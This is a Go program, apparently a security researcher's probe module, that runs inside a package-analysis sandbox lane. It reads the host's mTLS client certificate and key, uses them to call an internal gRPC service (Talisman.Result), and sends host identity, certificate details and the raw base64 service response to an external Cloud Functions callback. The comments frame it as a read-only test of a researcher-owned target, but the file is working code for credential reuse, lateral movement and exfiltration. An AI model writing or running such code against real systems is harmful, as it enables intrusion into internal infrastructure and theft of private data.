// Command talisman-result performs one fixed, read-only Talisman.Result call
// for a researcher-owned Go module version from the production Capslock lane.
// It emits a hash-bound receipt to one pinned callback and never retries.
package main

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"encoding/pem"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"time"
)

var callbackBaseURL string
var callbackSession string
var callbackURLSHA256 string

const (
	moduleName       = "github.com/benr00t3d/go-cgo-pkgsite-probe"
	probeVersion     = "v0.0.126-talisman-result-codex"
	expectedOrigin   = "/capslock/modcache/github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.126-talisman-result-codex"
	expectedAgent    = "go-cgo-pkgsite-probe-v126-talisman-result"
	targetCoordinate = "github.com/benr00t3d/go-cgo-pkgsite-probe@v0.0.121-codex"
	resultMethod     = "/sos.talisman.Talisman/Result"
	serviceHost      = "talisman-core.default.svc.cluster.local"
	servicePort      = 9000
	tlsServerName    = "localhost"

	// Independently decoded wire image for the fixed owned target.
	expectedRequestBytes  = 65
	expectedRequestSHA256 = "e6d3da92c595b368e65d3763861871971503b31105ae88c671f4c25cd26de313"

	clientCertificatePath = "/etc/tls/client/tls.crt"
	clientKeyPath         = "/etc/tls/client/tls.key"
	serverPoolPath        = "/etc/tls/server-pool/server-tls-pool.pem"

	callbackTimeout = 20 * time.Second
	internalTimeout = 35 * time.Second
	maximumGRPCBody = 8 * 1024
	maximumCallback = 64 * 1024
	maximumEntries  = 32
	maximumValue    = 4096
)

var capabilityKeyPattern = regexp.MustCompile(`^[A-Za-z0-9_.:/-]{1,128}$`)

type fileMetadata struct {
	Path     string `json:"path"`
	Present  bool   `json:"present"`
	Mode     string `json:"mode,omitempty"`
	Size     int64  `json:"size,omitempty"`
	Readable bool   `json:"readable"`
}

type certificateIdentity struct {
	Present      bool     `json:"present"`
	SHA256       string   `json:"sha256,omitempty"`
	Subject      string   `json:"subject,omitempty"`
	Issuer       string   `json:"issuer,omitempty"`
	DNSNames     []string `json:"dns_names"`
	IPAddresses  []string `json:"ip_addresses"`
	URIs         []string `json:"uris"`
	NotBeforeUTC string   `json:"not_before_utc,omitempty"`
	NotAfterUTC  string   `json:"not_after_utc,omitempty"`
}

type identityReceipt struct {
	Lane       string              `json:"lane"`
	CWD        string              `json:"cwd"`
	UID        int                 `json:"uid"`
	GID        int                 `json:"gid"`
	Hostname   string              `json:"hostname"`
	PID1Comm   string              `json:"pid1_comm"`
	PID1Exe    string              `json:"pid1_exe"`
	TLSFiles   []fileMetadata      `json:"tls_files"`
	ClientCert certificateIdentity `json:"client_certificate"`
}

type grpcMetadata struct {
	Present   bool   `json:"present"`
	Values    int    `json:"values,omitempty"`
	RawBytes  int    `json:"raw_bytes,omitempty"`
	RawSHA256 string `json:"raw_sha256,omitempty"`
	Text      string `json:"text,omitempty"`
}

type capabilityEntryReceipt struct {
	Key         string `json:"key"`
	ValueBytes  int    `json:"value_bytes"`
	ValueSHA256 string `json:"value_sha256"`
}

type resultReceipt struct {
	Attempted          bool                     `json:"attempted"`
	Method             string                   `json:"method"`
	Target             string                   `json:"target"`
	RequestBytes       int                      `json:"request_bytes"`
	RequestSHA256      string                   `json:"request_sha256"`
	HTTPStatus         int                      `json:"http_status,omitempty"`
	ContentType        string                   `json:"content_type,omitempty"`
	GRPCStatusHeader   grpcMetadata             `json:"grpc_status_header"`
	GRPCStatusTrailer  grpcMetadata             `json:"grpc_status_trailer"`
	ResponseBytes      int                      `json:"response_bytes,omitempty"`
	ResponseSHA256     string                   `json:"response_sha256,omitempty"`
	ResponseFrames     int                      `json:"response_frames,omitempty"`
	Entries            []capabilityEntryReceipt `json:"entries"`
	RefreshedPresent   bool                     `json:"refreshed_present"`
	RefreshedBytes     int                      `json:"refreshed_bytes,omitempty"`
	RefreshedSHA256    string                   `json:"refreshed_sha256,omitempty"`
	PrivateResponseB64 string                   `json:"private_response_b64,omitempty"`
	Verified           bool                     `json:"verified"`
	Error              string                   `json:"error,omitempty"`
	StartedUTC         string                   `json:"started_utc,omitempty"`
	FinishedUTC        string                   `json:"finished_utc,omitempty"`
	DurationMS         int64                    `json:"duration_ms,omitempty"`
}

type report struct {
	Schema                string          `json:"schema"`
	Phase                 string          `json:"phase"`
	Module                string          `json:"module"`
	Version               string          `json:"version"`
	Target                string          `json:"target"`
	StartedUTC            string          `json:"started_utc"`
	FinishedUTC           string          `json:"finished_utc,omitempty"`
	Identity              identityReceipt `json:"identity"`
	PreflightReportSHA256 string          `json:"preflight_report_sha256,omitempty"`
	Result                resultReceipt   `json:"result"`
	Outcome               string          `json:"outcome"`
	Error                 string          `json:"error,omitempty"`
}

type protoField struct {
	Number int
	Value  []byte
}

func main() {
	if validateRuntimeConfiguration() != nil || validateStaticPins() != nil || len(os.Args) != 4 || os.Args[1] != "--specwrap" || os.Args[2] != "--origin-dir" {
		return
	}
	origin := filepath.Clean(os.Args[3])
	if origin != expectedOrigin || origin != os.Args[3] || os.Geteuid() != 0 {
		return
	}
	if !strings.Contains(readBoundedText("/proc/1/cmdline", 8192), "talisman-worker-capabilities") {
		return
	}

	started := time.Now()
	receipt := report{
		Schema: "owned-talisman-result-read/v1", Phase: "preflight", Module: moduleName,
		Version: probeVersion, Target: targetCoordinate, StartedUTC: started.UTC().Format(time.RFC3339Nano),
		Identity: inspectIdentity(origin), Result: emptyResultReceipt(), Outcome: "preflight",
	}
	certIdentity, certErr := readClientCertificateIdentity()
	receipt.Identity.ClientCert = certIdentity
	if certErr != nil {
		return
	}
	receipt.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	preflightHash, err := submitPhase("preflight", receipt)
	if err != nil {
		return
	}
	receipt.PreflightReportSHA256 = preflightHash
	receipt.Result = runTalismanResult()
	receipt.Phase = "result"
	receipt.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
	if receipt.Result.Verified {
		receipt.Outcome = "owned_talisman_result_verified"
	} else {
		receipt.Outcome, receipt.Error = "talisman_result_not_verified", receipt.Result.Error
	}
	_, _ = submitPhase("result", receipt)
}

func emptyResultReceipt() resultReceipt {
	return resultReceipt{Method: resultMethod, Target: targetCoordinate, Entries: []capabilityEntryReceipt{}}
}

func validateStaticPins() error {
	body := buildResultRequest()
	digest := sha256.Sum256(body)
	if expectedRequestBytes <= 0 || len(body) != expectedRequestBytes || hex.EncodeToString(digest[:]) != expectedRequestSHA256 {
		return errors.New("request pins not finalized")
	}
	return nil
}

func validNonce(value string) bool {
	if len(value) != 64 {
		return false
	}
	for _, character := range value {
		if (character < '0' || character > '9') && (character < 'a' || character > 'f') {
			return false
		}
	}
	return true
}

func validateRuntimeConfiguration() error {
	if !validNonce(callbackSession) || len(callbackURLSHA256) != 64 {
		return errors.New("invalid callback identity")
	}
	parsed, err := url.Parse(callbackBaseURL)
	expectedPath := "/go-cgo-v126-talisman-result-codex/v1/session/" + callbackSession
	if err != nil || parsed.Scheme != "https" || parsed.Host != "us-central1-s0victim-44547.cloudfunctions.net" ||
		parsed.User != nil || parsed.Opaque != "" || parsed.RawPath != "" || parsed.RawQuery != "" || parsed.Fragment != "" ||
		parsed.Path != expectedPath {
		return errors.New("callback URL outside fixed shape")
	}
	digest := sha256.Sum256([]byte(callbackBaseURL))
	if hex.EncodeToString(digest[:]) != callbackURLSHA256 {
		return errors.New("callback URL digest mismatch")
	}
	return nil
}

func inspectIdentity(origin string) identityReceipt {
	hostname, _ := os.Hostname()
	result := identityReceipt{
		Lane: "capslock", CWD: origin, UID: os.Geteuid(), GID: os.Getegid(), Hostname: boundedText(hostname, 128),
		PID1Comm: boundedText(strings.TrimSpace(readBoundedText("/proc/1/comm", 256)), 128),
		TLSFiles: []fileMetadata{}, ClientCert: certificateIdentity{DNSNames: []string{}, IPAddresses: []string{}, URIs: []string{}},
	}
	if executable, err := os.Readlink("/proc/1/exe"); err == nil {
		result.PID1Exe = boundedText(executable, 256)
	}
	for _, path := range []string{serverPoolPath, clientCertificatePath, clientKeyPath} {
		item := fileMetadata{Path: path, Readable: syscall.Access(path, 4) == nil}
		if info, err := os.Stat(path); err == nil && info.Mode().IsRegular() {
			item.Present, item.Mode, item.Size = true, info.Mode().String(), info.Size()
		}
		result.TLSFiles = append(result.TLSFiles, item)
	}
	return result
}

func readClientCertificateIdentity() (certificateIdentity, error) {
	result := certificateIdentity{DNSNames: []string{}, IPAddresses: []string{}, URIs: []string{}}
	raw, err := readBoundedFile(clientCertificatePath, 32*1024)
	if err != nil {
		return result, err
	}
	block, _ := pem.Decode(raw)
	if block == nil || block.Type != "CERTIFICATE" {
		return result, errors.New("invalid client certificate PEM")
	}
	certificate, err := x509.ParseCertificate(block.Bytes)
	if err != nil {
		return result, err
	}
	digest := sha256.Sum256(certificate.Raw)
	result.Present, result.SHA256 = true, hex.EncodeToString(digest[:])
	result.Subject, result.Issuer = boundedText(certificate.Subject.String(), 512), boundedText(certificate.Issuer.String(), 512)
	result.NotBeforeUTC, result.NotAfterUTC = certificate.NotBefore.UTC().Format(time.RFC3339Nano), certificate.NotAfter.UTC().Format(time.RFC3339Nano)
	for _, name := range certificate.DNSNames {
		result.DNSNames = append(result.DNSNames, boundedText(name, 256))
	}
	for _, address := range certificate.IPAddresses {
		result.IPAddresses = append(result.IPAddresses, address.String())
	}
	for _, uri := range certificate.URIs {
		result.URIs = append(result.URIs, boundedText(uri.String(), 512))
	}
	return result, nil
}

func appendVarint(target []byte, value uint64) []byte {
	var buffer [binary.MaxVarintLen64]byte
	length := binary.PutUvarint(buffer[:], value)
	return append(target, buffer[:length]...)
}

func appendBytesField(target []byte, number int, value []byte) []byte {
	target = appendVarint(target, uint64(number<<3|2))
	target = appendVarint(target, uint64(len(value)))
	return append(target, value...)
}

func appendStringField(target []byte, number int, value string) []byte {
	return appendBytesField(target, number, []byte(value))
}

func grpcFrame(payload []byte) []byte {
	frame := make([]byte, 5, 5+len(payload))
	binary.BigEndian.PutUint32(frame[1:], uint32(len(payload)))
	return append(frame, payload...)
}

func buildResultRequest() []byte {
	capability := appendStringField(nil, 1, targetCoordinate)
	request := appendBytesField(nil, 2, capability)
	return grpcFrame(request)
}

func runTalismanResult() (result resultReceipt) {
	started := time.Now()
	result = emptyResultReceipt()
	result.Attempted, result.StartedUTC = true, started.UTC().Format(time.RFC3339Nano)
	defer func() {
		result.FinishedUTC = time.Now().UTC().Format(time.RFC3339Nano)
		result.DurationMS = time.Since(started).Milliseconds()
	}()
	body := buildResultRequest()
	digest := sha256.Sum256(body)
	result.RequestBytes, result.RequestSHA256 = len(body), hex.EncodeToString(digest[:])
	if len(body) != expectedRequestBytes || result.RequestSHA256 != expectedRequestSHA256 {
		result.Error = "result_request_pin_mismatch"
		return
	}
	client, endpoint, err := newInternalClient()
	if err != nil {
		result.Error = "internal_client_failed"
		return
	}
	defer client.CloseIdleConnections()
	ctx, cancel := context.WithTimeout(context.Background(), internalTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint+resultMethod, bytes.NewReader(body))
	if err != nil {
		result.Error = "result_request_failed"
		return
	}
	request.Header.Set("Content-Type", "application/grpc")
	request.Header.Set("TE", "trailers")
	request.Header.Set("Grpc-Timeout", "30S")
	request.Header.Set("User-Agent", expectedAgent)
	response, err := client.Do(request)
	if err != nil {
		result.Error = "result_transport_failed"
		return
	}
	defer response.Body.Close()
	result.HTTPStatus, result.ContentType = response.StatusCode, response.Header.Get("Content-Type")
	result.GRPCStatusHeader = captureGRPCMetadata(response.Header, "Grpc-Status")
	responseBody, err := io.ReadAll(io.LimitReader(response.Body, maximumGRPCBody+1))
	if err != nil || len(responseBody) == 0 || len(responseBody) > maximumGRPCBody {
		result.Error = "result_response_oversize_or_unreadable"
		return
	}
	result.GRPCStatusTrailer = captureGRPCMetadata(response.Trailer, "Grpc-Status")
	result.ResponseBytes = len(responseBody)
	responseDigest := sha256.Sum256(responseBody)
	result.ResponseSHA256 = hex.EncodeToString(responseDigest[:])
	result.PrivateResponseB64 = base64.StdEncoding.EncodeToString(responseBody)
	frames, framesOK := splitGRPCFrames(responseBody)
	result.ResponseFrames = len(frames)
	if !framesOK || len(frames) != 1 {
		result.Error = "result_response_frames_invalid"
		return
	}
	entries, refreshed, err := parseResultResponse(frames[0])
	if err != nil {
		result.Error = "result_response_schema_invalid"
		return
	}
	result.Entries = entries
	if refreshed != nil {
		refreshedDigest := sha256.Sum256(refreshed)
		result.RefreshedPresent, result.RefreshedBytes = true, len(refreshed)
		result.RefreshedSHA256 = hex.EncodeToString(refreshedDigest[:])
	}
	if response.StatusCode != http.StatusOK || strings.TrimSpace(strings.ToLower(result.ContentType)) != "application/grpc" ||
		!exactZeroGRPCStatus(result.GRPCStatusHeader, result.GRPCStatusTrailer) || len(result.Entries) == 0 {
		result.Error = "result_response_not_exact"
		return
	}
	result.Verified = true
	return
}

func splitGRPCFrames(body []byte) ([][]byte, bool) {
	frames := [][]byte{}
	for offset := 0; offset < len(body); {
		if len(body)-offset < 5 || body[offset] != 0 {
			return frames, false
		}
		length := int(binary.BigEndian.Uint32(body[offset+1 : offset+5]))
		offset += 5
		if length < 0 || length > len(body)-offset {
			return frames, false
		}
		frames = append(frames, append([]byte(nil), body[offset:offset+length]...))
		offset += length
	}
	return frames, len(frames) > 0
}

func decodeLengthFields(data []byte) ([]protoField, error) {
	fields := []protoField{}
	for offset := 0; offset < len(data); {
		key, width := binary.Uvarint(data[offset:])
		if width <= 0 {
			return nil, errors.New("invalid field key")
		}
		offset += width
		number, wire := int(key>>3), int(key&7)
		if number <= 0 || wire != 2 {
			return nil, errors.New("unexpected wire field")
		}
		length, width := binary.Uvarint(data[offset:])
		if width <= 0 {
			return nil, errors.New("invalid field length")
		}
		offset += width
		if length > uint64(len(data)-offset) {
			return nil, errors.New("truncated field")
		}
		fields = append(fields, protoField{Number: number, Value: append([]byte(nil), data[offset:offset+int(length)]...)})
		offset += int(length)
	}
	return fields, nil
}

func parseResultResponse(payload []byte) ([]capabilityEntryReceipt, []byte, error) {
	outer, err := decodeLengthFields(payload)
	if err != nil || len(outer) != 1 || outer[0].Number != 2 {
		return nil, nil, errors.New("invalid ResultResponse")
	}
	capability, err := decodeLengthFields(outer[0].Value)
	if err != nil || len(capability) == 0 || len(capability) > maximumEntries+1 {
		return nil, nil, errors.New("invalid CapabilityResultResponse")
	}
	entries := make([]capabilityEntryReceipt, 0, len(capability))
	seen := map[string]bool{}
	var refreshed []byte
	for _, field := range capability {
		switch field.Number {
		case 1:
			entry, err := decodeLengthFields(field.Value)
			if err != nil || len(entry) != 2 {
				return nil, nil, errors.New("invalid map entry")
			}
			var key string
			var value []byte
			keySeen, valueSeen := false, false
			for _, item := range entry {
				switch item.Number {
				case 1:
					if keySeen {
						return nil, nil, errors.New("duplicate map key field")
					}
					keySeen = true
					key = string(item.Value)
				case 2:
					if valueSeen {
						return nil, nil, errors.New("duplicate map value field")
					}
					valueSeen = true
					value = item.Value
				default:
					return nil, nil, errors.New("unknown map field")
				}
			}
			if !keySeen || !valueSeen || !capabilityKeyPattern.MatchString(key) || len(value) == 0 || len(value) > maximumValue || seen[key] {
				return nil, nil, errors.New("invalid map entry value")
			}
			seen[key] = true
			digest := sha256.Sum256(value)
			entries = append(entries, capabilityEntryReceipt{Key: key, ValueBytes: len(value), ValueSHA256: hex.EncodeToString(digest[:])})
		case 2:
			if refreshed != nil || len(field.Value) == 0 || len(field.Value) > 128 {
				return nil, nil, errors.New("invalid refreshed timestamp")
			}
			refreshed = field.Value
		default:
			return nil, nil, errors.New("unknown capability response field")
		}
	}
	if len(entries) == 0 {
		return nil, nil, errors.New("empty capability response")
	}
	sort.Slice(entries, func(i, j int) bool { return entries[i].Key < entries[j].Key })
	return entries, refreshed, nil
}

func captureGRPCMetadata(header http.Header, name string) grpcMetadata {
	values := []string(nil)
	for key, candidates := range header {
		if strings.EqualFold(key, name) {
			values = append(values, candidates...)
		}
	}
	if values == nil {
		return grpcMetadata{}
	}
	raw := strings.Join(values, "\x00")
	digest := sha256.Sum256([]byte(raw))
	text := raw
	if len(text) > 64 {
		text = text[:64] + "[truncated]"
	}
	return grpcMetadata{Present: true, Values: len(values), RawBytes: len(raw), RawSHA256: hex.EncodeToString(digest[:]), Text: text}
}

func exactZeroGRPCStatus(header, trailer grpcMetadata) bool {
	zeroDigest := sha256.Sum256([]byte("0"))
	return !header.Present && trailer.Present && trailer.Values == 1 && trailer.RawBytes == 1 &&
		trailer.RawSHA256 == hex.EncodeToString(zeroDigest[:]) && trailer.Text == "0"
}

func newInternalClient() (*http.Client, string, error) {
	certificate, err := tls.LoadX509KeyPair(clientCertificatePath, clientKeyPath)
	if err != nil {
		return nil, "", err
	}
	pemBytes, err := readBoundedFile(serverPoolPath, 64*1024)
	if err != nil {
		return nil, "", err
	}
	roots := x509.NewCertPool()
	if !roots.AppendCertsFromPEM(pemBytes) {
		return nil, "", errors.New("root pool empty")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	addresses, err := net.DefaultResolver.LookupIPAddr(ctx, serviceHost)
	if err != nil {
		return nil, "", errors.New("fixed internal service did not resolve")
	}
	var selected net.IP
	for _, candidate := range addresses {
		if candidate.IP.IsPrivate() && !candidate.IP.IsUnspecified() && !candidate.IP.IsMulticast() {
			selected = candidate.IP
			break
		}
	}
	if selected == nil {
		return nil, "", errors.New("fixed internal service had no private address")
	}
	dialAddress := net.JoinHostPort(selected.String(), strconv.Itoa(servicePort))
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{certificate}, RootCAs: roots, MinVersion: tls.VersionTLS12,
		ServerName: tlsServerName, InsecureSkipVerify: true,
		VerifyConnection: func(state tls.ConnectionState) error { return verifyInternalPeer(state, roots) },
	}
	dialer := &net.Dialer{Timeout: 10 * time.Second, KeepAlive: 30 * time.Second}
	transport := &http.Transport{
		Proxy: nil, ForceAttemptHTTP2: true, TLSClientConfig: tlsConfig,
		DialContext: func(ctx context.Context, network, _ string) (net.Conn, error) {
			return dialer.DialContext(ctx, network, dialAddress)
		},
	}
	endpoint := "https://" + net.JoinHostPort(serviceHost, strconv.Itoa(servicePort))
	return &http.Client{Transport: transport, CheckRedirect: rejectRedirect, Timeout: internalTimeout}, endpoint, nil
}

func verifyInternalPeer(state tls.ConnectionState, roots *x509.CertPool) error {
	if len(state.PeerCertificates) == 0 {
		return errors.New("internal TLS peer sent no certificate")
	}
	leaf := state.PeerCertificates[0]
	intermediates := x509.NewCertPool()
	for _, certificate := range state.PeerCertificates[1:] {
		intermediates.AddCert(certificate)
	}
	if _, err := leaf.Verify(x509.VerifyOptions{Roots: roots, Intermediates: intermediates, KeyUsages: []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth}}); err != nil {
		return err
	}
	if len(leaf.DNSNames) > 0 {
		return leaf.VerifyHostname(tlsServerName)
	}
	if leaf.Subject.CommonName != tlsServerName {
		return errors.New("internal TLS peer identity mismatch")
	}
	return nil
}

func submitPhase(phase string, value report) (string, error) {
	if phase != "preflight" && phase != "result" {
		return "", errors.New("invalid callback phase")
	}
	encoded, err := json.Marshal(value)
	if err != nil || len(encoded) == 0 || len(encoded) > maximumCallback {
		return "", errors.New("callback body invalid")
	}
	digest := sha256.Sum256(encoded)
	digestText := hex.EncodeToString(digest[:])
	ctx, cancel := context.WithTimeout(context.Background(), callbackTimeout)
	defer cancel()
	request, err := http.NewRequestWithContext(ctx, http.MethodPut, callbackBaseURL+"/"+phase, bytes.NewReader(encoded))
	if err != nil {
		return digestText, err
	}
	request.Header.Set("Content-Type", "application/json")
	request.Header.Set("User-Agent", expectedAgent)
	request.Header.Set("X-Codex-Probe-Session", callbackSession)
	client := callbackHTTPClient()
	defer client.CloseIdleConnections()
	response, err := client.Do(request)
	if err != nil {
		return digestText, err
	}
	defer response.Body.Close()
	responseBody, readErr := io.ReadAll(io.LimitReader(response.Body, 4097))
	if response.StatusCode != http.StatusCreated {
		return digestText, fmt.Errorf("callback status %d", response.StatusCode)
	}
	if readErr != nil || len(responseBody) > 4096 || !validCallbackAck(responseBody, phase, digestText) {
		return digestText, errors.New("callback acknowledgement invalid")
	}
	return digestText, nil
}

func validCallbackAck(body []byte, phase, digest string) bool {
	var value map[string]any
	if json.Unmarshal(body, &value) != nil || len(value) != 3 {
		return false
	}
	accepted, acceptedOK := value["accepted"].(bool)
	ackPhase, phaseOK := value["phase"].(string)
	ackDigest, digestOK := value["sha256"].(string)
	return acceptedOK && accepted && phaseOK && ackPhase == phase && digestOK && ackDigest == digest
}

func callbackHTTPClient() *http.Client {
	transport := &http.Transport{Proxy: nil, TLSClientConfig: &tls.Config{MinVersion: tls.VersionTLS12}}
	return &http.Client{Transport: transport, CheckRedirect: rejectRedirect, Timeout: callbackTimeout}
}

func rejectRedirect(_ *http.Request, _ []*http.Request) error { return http.ErrUseLastResponse }

func readBoundedFile(path string, maximum int64) ([]byte, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	value, err := io.ReadAll(io.LimitReader(file, maximum+1))
	if err != nil || int64(len(value)) > maximum {
		return nil, errors.New("bounded read failed")
	}
	return value, nil
}

func readBoundedText(path string, maximum int64) string {
	value, err := readBoundedFile(path, maximum)
	if err != nil {
		return ""
	}
	return string(value)
}

func boundedText(value string, maximum int) string {
	if len(value) > maximum {
		return value[:maximum] + "[truncated]"
	}
	return value
}
